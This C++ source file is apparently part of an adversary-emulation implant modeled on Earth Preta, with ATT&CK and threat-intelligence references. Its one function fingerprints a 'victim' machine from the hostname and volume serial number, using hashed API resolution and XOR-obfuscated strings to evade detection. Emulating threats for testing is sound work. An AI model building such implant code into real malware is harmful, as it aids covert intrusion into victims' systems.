#include "shellcode.hpp"
#include "util.hpp"
#include "fnv1a.hpp"

#include <al/import.hpp>

/*
 * GenerateNewVictimID:
 *      About:
 *          Generates a random GUID using the previously obtained victim hostname
 *          and volume serial number. Assumes the ctx struct already has the
 *          hostname populated.
 *      Result:
 *          Populates the shellcode context with the generated victim ID.
 *          Returns 0 on success, otherwise returns an error code.
 *      MITRE ATT&CK Techniques:
 *          T1082: System Information Discovery
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
 */
DWORD GenerateNewVictimID(sh_context* ctx) {
    // Resolve required APIs
    GetVolumeInformationW_t fp_GetVolumeInformationW = GP(ctx->fp.h_kernel32, GetVolumeInformationW, by_fnv1a);
    if (!fp_GetVolumeInformationW) {
        AesLogger::LogError(&(ctx->log_ctx), "Failed to resolve GetVolumeInformationW API."_xor);
        return FAIL_GET_GETVOLUMEINFORMATIONW;
    }

    DWORD serial_number;
    if (!fp_GetVolumeInformationW(NULL, NULL, 0, &serial_number, NULL, NULL, NULL, 0)) {
        DWORD error_code = ctx->fp.shared_fp.fp_GetLastError();
        AesLogger::LogError(&(ctx->log_ctx), "GetVolumeInformationW failed with error code: %d."_xor, error_code);
        return error_code;
    } else {
        AesLogger::LogDebug(&(ctx->log_ctx), "Victim Volume ID: %08X"_xor, serial_number);
    }

    // Generate ID from inputs
    unsigned char* p_serial_number = reinterpret_cast<unsigned char*>(&serial_number);
    for(size_t i = 0; i < sizeof(ctx->victim_id); i++) {
        ctx->victim_id[i] = ((unsigned char)(ctx->hostname[i % ctx->hostname_size]) + p_serial_number[i % sizeof(DWORD)]) % 256;
    }

    return ERROR_SUCCESS;
}
